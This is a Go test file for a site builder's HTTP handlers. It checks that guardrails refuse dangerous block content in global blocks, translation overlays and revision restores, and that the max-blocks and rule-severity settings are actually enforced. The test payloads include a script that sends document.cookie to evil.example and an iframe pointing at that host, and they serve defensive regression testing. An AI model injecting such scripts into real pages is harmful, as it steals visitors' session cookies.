package handlers

import (
	"bytes"
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/go-chi/chi/v5"

	"github.com/bright-interaction/slab/internal/agent"
	authmw "github.com/bright-interaction/slab/internal/middleware"
	"github.com/bright-interaction/slab/internal/revisions"
	"github.com/bright-interaction/slab/internal/store"
)

// The audit's repro, executed: a <script> payload that create_block refuses is
// pushed at each of the three writers that never ran the guardrail engine, and
// every one of them must now refuse it too.
//
// The static coverage test next door proves no writer can be added without a
// guardrail call. These tests prove the guardrail call actually refuses, which
// is the half a static walk cannot see.

const scriptPayload = `{"html":"<script>fetch('https://evil.example/'+document.cookie)</script>"}`

func withParams(h http.HandlerFunc, kv ...string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		rctx := chi.NewRouteContext()
		for i := 0; i+1 < len(kv); i += 2 {
			rctx.URLParams.Add(kv[i], kv[i+1])
		}
		r = r.WithContext(context.WithValue(r.Context(), chi.RouteCtxKey, rctx))
		h(w, r)
	}
}

func jsonReq(method string, body any) *http.Request {
	b, _ := json.Marshal(body)
	req := httptest.NewRequest(method, "/", bytes.NewReader(b))
	req.Header.Set("Content-Type", "application/json")
	return req
}

// TestGlobalBlockWrite_RejectsScriptPayload is the audit's headline repro. A
// global block renders in the header and footer of EVERY page, so this payload
// used to ship site-wide via two surfaces that never called ValidateBlock.
func TestGlobalBlockWrite_RejectsScriptPayload(t *testing.T) {
	_, q := setupDeployTestDB(t)
	siteID := "gbguard000000000000001"
	seedSite(t, q, siteID)

	t.Run("admin REST create", func(t *testing.T) {
		h := NewGlobalBlockHandler(nil, q)
		rr := httptest.NewRecorder()
		withParams(h.Create, "siteID", siteID)(rr, jsonReq(http.MethodPost, map[string]any{
			"name":       "Site Header",
			"slot":       "header",
			"block_type": "html",
			"data":       json.RawMessage(scriptPayload),
		}))
		assertGuardrailRefusal(t, rr, "tags are not allowed in block data")

		rows, _ := q.ListGlobalBlocksBySite(context.Background(), siteID)
		for _, gb := range rows {
			if strings.Contains(gb.DataJson, "<script") {
				t.Fatalf("script payload was persisted to global_blocks despite the refusal: %s", gb.DataJson)
			}
		}
	})

	t.Run("admin REST update", func(t *testing.T) {
		ctx := context.Background()
		id := "gb-clean-0000000000001"
		if err := q.CreateGlobalBlock(ctx, store.CreateGlobalBlockParams{
			ID: id, SiteID: siteID, Name: "Site Footer", Slot: "footer",
			BlockType: "html", DataJson: `{"html":"<p>ok</p>"}`, StyleJson: "{}", SortOrder: 0,
		}); err != nil {
			t.Fatalf("seed global block: %v", err)
		}
		h := NewGlobalBlockHandler(nil, q)
		rr := httptest.NewRecorder()
		withParams(h.Update, "siteID", siteID, "blockID", id)(rr, jsonReq(http.MethodPatch, map[string]any{
			"data": json.RawMessage(scriptPayload),
		}))
		assertGuardrailRefusal(t, rr, "tags are not allowed in block data")

		after, err := q.GetGlobalBlockByID(ctx, id)
		if err != nil {
			t.Fatalf("get global block: %v", err)
		}
		if strings.Contains(after.DataJson, "<script") {
			t.Fatalf("script payload overwrote the clean global block: %s", after.DataJson)
		}
	})

	t.Run("agent PUT /api/agent/global/{slot}", func(t *testing.T) {
		h := NewAgentHandler(nil, q, nil)
		rr := httptest.NewRecorder()
		req := jsonReq(http.MethodPut, map[string]any{
			"block_type": "html",
			"data":       json.RawMessage(scriptPayload),
		})
		req = req.WithContext(context.WithValue(req.Context(), authmw.AgentContextKey, &authmw.AgentIdentity{
			KeyID: "k1", SiteID: siteID, Name: "test", Capabilities: []string{"write"},
		}))
		withParams(h.UpdateGlobalBlock, "slot", "header")(rr, req)
		assertGuardrailRefusal(t, rr, "tags are not allowed in block data")
	})
}

// TestBlockLocaleWrite_RejectsScriptPayload covers writer 5: the translation
// overlay, which checked only that the payload parsed as JSON. The overlay is
// what the builder renders for that locale, so it is a rendered payload.
func TestBlockLocaleWrite_RejectsScriptPayload(t *testing.T) {
	_, q := setupDeployTestDB(t)
	ctx := context.Background()
	siteID := "locguard00000000000001"
	seedSite(t, q, siteID)

	pageID := "page-loc-000000000001"
	if err := q.CreatePage(ctx, store.CreatePageParams{
		ID: pageID, SiteID: siteID, Title: "Home", Slug: "home", Layout: "default",
	}); err != nil {
		t.Fatalf("create page: %v", err)
	}
	blockID := "block-loc-00000000001"
	if err := q.CreateBlock(ctx, store.CreateBlockParams{
		ID: blockID, PageID: pageID, BlockType: "html", Name: "Body",
		DataJson: `{"html":"<p>ok</p>"}`, StyleJson: "{}", IsVisible: 1,
	}); err != nil {
		t.Fatalf("create block: %v", err)
	}

	h := NewLocalesHandler(nil, q)

	t.Run("REST locale upsert", func(t *testing.T) {
		rr := httptest.NewRecorder()
		withParams(h.UpsertBlockLocale, "siteID", siteID, "blockID", blockID, "locale", "sv")(
			rr, jsonReq(http.MethodPut, map[string]any{"data_json": scriptPayload}))
		assertGuardrailRefusal(t, rr, "tags are not allowed in block data")

		if _, err := q.GetBlockLocale(ctx, store.GetBlockLocaleParams{BlockID: blockID, Locale: "sv"}); err == nil {
			t.Fatal("a block_locale row was written despite the refusal")
		}
	})

	t.Run("agent translation overlay", func(t *testing.T) {
		err := h.ApplyTranslationForAgent(ctx, siteID, pageID, "de",
			PageTranslationOverlay{Title: "Startseite"},
			[]BlockTranslationOverlay{{BlockID: blockID, DataJson: scriptPayload}})
		if err == nil {
			t.Fatal("ApplyTranslationForAgent accepted a <script> overlay")
		}
		if !strings.Contains(err.Error(), "guardrail") {
			t.Fatalf("expected a guardrail refusal, got: %v", err)
		}
		if _, err := q.GetBlockLocale(ctx, store.GetBlockLocaleParams{BlockID: blockID, Locale: "de"}); err == nil {
			t.Fatal("a block_locale row was written despite the refusal")
		}
		// The pre-write loop must refuse before ANY row lands, including the
		// page_locale row that is written first in the un-guarded ordering.
		if _, err := q.GetPageLocale(ctx, store.GetPageLocaleParams{PageID: pageID, Locale: "de"}); err == nil {
			t.Fatal("the page_locale row was written before the overlay was refused")
		}
	})
}

// TestRevisionRestore_CannotReachAForbiddenBlockType covers writer 6, and the
// exact escalation the audit named: a tenant adds an allow_block_type rule, then
// restores a snapshot taken before the rule to get the forbidden type back.
func TestRevisionRestore_CannotReachAForbiddenBlockType(t *testing.T) {
	_, q := setupDeployTestDB(t)
	ctx := context.Background()
	siteID := "revguard00000000000001"
	seedSite(t, q, siteID)

	pageID := "page-rev-000000000001"
	if err := q.CreatePage(ctx, store.CreatePageParams{
		ID: pageID, SiteID: siteID, Title: "Home", Slug: "home", Layout: "default",
	}); err != nil {
		t.Fatalf("create page: %v", err)
	}
	blockID := "block-rev-00000000001"
	if err := q.CreateBlock(ctx, store.CreateBlockParams{
		ID: blockID, PageID: pageID, BlockType: "raw_html", Name: "Legacy",
		DataJson: `{"html":"<p>legacy</p>"}`, StyleJson: "{}", IsVisible: 1,
	}); err != nil {
		t.Fatalf("create block: %v", err)
	}

	// Snapshot taken while raw_html was still allowed.
	rec := revisions.New(q)
	cur, err := q.GetBlockByID(ctx, blockID)
	if err != nil {
		t.Fatalf("get block: %v", err)
	}
	if err := rec.Record(ctx, revisions.RecordParams{
		SiteID: siteID, EntityType: revisions.EntityTypeBlock, EntityID: blockID,
		Snapshot: cur, ChangeSummary: "pre-rule", CreatedBy: "user:tester",
	}); err != nil {
		t.Fatalf("record: %v", err)
	}

	// The tenant then locks the site down to "html" only, and rewrites the block.
	if err := q.CreateGuardrail(ctx, store.CreateGuardrailParams{
		ID: "gr-allow-000000000001", SiteID: siteID,
		RuleType: "allow_block_type", Target: "*", Value: "html", Severity: "error",
	}); err != nil {
		t.Fatalf("create guardrail: %v", err)
	}
	if err := q.UpdateBlock(ctx, store.UpdateBlockParams{
		ID: blockID, BlockType: "html", Name: "Body",
		DataJson: `{"html":"<p>ok</p>"}`, StyleJson: "{}", IsVisible: 1,
	}); err != nil {
		t.Fatalf("update block: %v", err)
	}

	h := NewRevisionsHandler(nil, q, rec)

	t.Run("MCP restore_revision", func(t *testing.T) {
		_, err := h.RestoreForAgent(ctx, siteID, revisions.EntityTypeBlock, blockID, 1, "agent:test")
		if err == nil {
			t.Fatal("RestoreForAgent restored a snapshot carrying a now-forbidden block type")
		}
		if !strings.Contains(err.Error(), "guardrail") {
			t.Fatalf("expected a guardrail refusal, got: %v", err)
		}
		after, _ := q.GetBlockByID(ctx, blockID)
		if after.BlockType != "html" {
			t.Fatalf("block type reverted to %q; the allow_block_type rule was bypassed by restore", after.BlockType)
		}
	})

	t.Run("REST restore", func(t *testing.T) {
		rr := httptest.NewRecorder()
		req := jsonReq(http.MethodPost, map[string]any{})
		req = req.WithContext(context.WithValue(req.Context(), authmw.UserContextKey, &authmw.AuthUser{ID: "u1", Role: "admin"}))
		withParams(h.Restore, "siteID", siteID, "entityType", "block", "entityID", blockID, "version", "1")(rr, req)
		assertGuardrailRefusal(t, rr, "not allowed")

		after, _ := q.GetBlockByID(context.Background(), blockID)
		if after.BlockType != "html" {
			t.Fatalf("block type reverted to %q; the allow_block_type rule was bypassed by restore", after.BlockType)
		}
	})
}

// TestMaxBlocksZero_IsEnforced pins the declared-but-unenforced constraint. The
// agent context reports max_blocks: 0 as a real limit; the enforcer required
// n > 0 and silently fell back to the 50-block default, so the one value that
// locks a page down was the one value that did nothing.
func TestMaxBlocksZero_IsEnforced(t *testing.T) {
	_, q := setupDeployTestDB(t)
	ctx := context.Background()
	siteID := "maxblocks00000000001"
	seedSite(t, q, siteID)

	pageID := "page-max-000000000001"
	if err := q.CreatePage(ctx, store.CreatePageParams{
		ID: pageID, SiteID: siteID, Title: "Locked", Slug: "locked", Layout: "default",
	}); err != nil {
		t.Fatalf("create page: %v", err)
	}
	if err := q.CreateGuardrail(ctx, store.CreateGuardrailParams{
		ID: "gr-max-0000000000001", SiteID: siteID,
		RuleType: "max_blocks", Target: "*", Value: "0", Severity: "error",
	}); err != nil {
		t.Fatalf("create guardrail: %v", err)
	}

	g := agent.NewGuardrailEngine(q)
	v := g.ValidateBlockCount(ctx, siteID, pageID)
	if !agent.HasErrors(v) {
		t.Fatalf("max_blocks: 0 did not refuse a write to an empty page; violations=%+v", v)
	}

	// And what the agent is told matches what the engine does. These two read
	// the same row and used to disagree about which values were real.
	sc, err := agent.NewContextBuilder(q).Build(ctx, siteID)
	if err != nil {
		t.Fatalf("build agent context: %v", err)
	}
	if sc.Constraints.MaxBlocksPerPage != 0 {
		t.Fatalf("agent context reports max_blocks_per_page=%d while the enforcer uses 0; the two disagree again",
			sc.Constraints.MaxBlocksPerPage)
	}
}

// TestSeededGuardrails_DeclareTheSeverityTheyAreEnforcedAt pins the other
// declared-but-unenforced rule. Every caller gates on HasErrors, which counts
// only "error", so a seeded default at "warning" is advertised to the agent as a
// constraint and can never refuse anything.
func TestSeededGuardrails_DeclareTheSeverityTheyAreEnforcedAt(t *testing.T) {
	_, q := setupDeployTestDB(t)
	ctx := context.Background()
	siteID := "seedsev0000000000001"
	seedSite(t, q, siteID)

	if err := agent.SeedDefaultGuardrailsWith(ctx, q, siteID); err != nil {
		t.Fatalf("seed guardrails: %v", err)
	}
	rules, err := q.ListActiveGuardrailsBySite(ctx, siteID)
	if err != nil {
		t.Fatalf("list guardrails: %v", err)
	}
	if len(rules) == 0 {
		t.Fatal("no seeded guardrails found; this test is covering nothing")
	}
	for _, r := range rules {
		if r.Severity != "error" {
			t.Errorf("seeded guardrail %s/%s is severity %q. Every caller gates on HasErrors, "+
				"which counts only \"error\", so this rule is advertised to the agent and can "+
				"never refuse a write.", r.RuleType, r.Value, r.Severity)
		}
	}

	// End to end: the seeded <iframe> rule now actually refuses a payload.
	g := agent.NewGuardrailEngine(q)
	v := g.ValidateBlock(ctx, siteID, "html", `{"html":"<iframe src=\"https://evil.example\"></iframe>"}`)
	if !agent.HasErrors(v) {
		t.Fatalf("the seeded <iframe> forbid_pattern refused nothing; violations=%+v", v)
	}
}

func assertGuardrailRefusal(t *testing.T, rr *httptest.ResponseRecorder, wantSubstring string) {
	t.Helper()
	if rr.Code != http.StatusUnprocessableEntity {
		t.Fatalf("want 422 guardrail refusal, got %d: %s", rr.Code, rr.Body.String())
	}
	if !strings.Contains(strings.ToLower(rr.Body.String()), strings.ToLower(wantSubstring)) {
		t.Fatalf("422 body does not mention %q: %s", wantSubstring, rr.Body.String())
	}
}
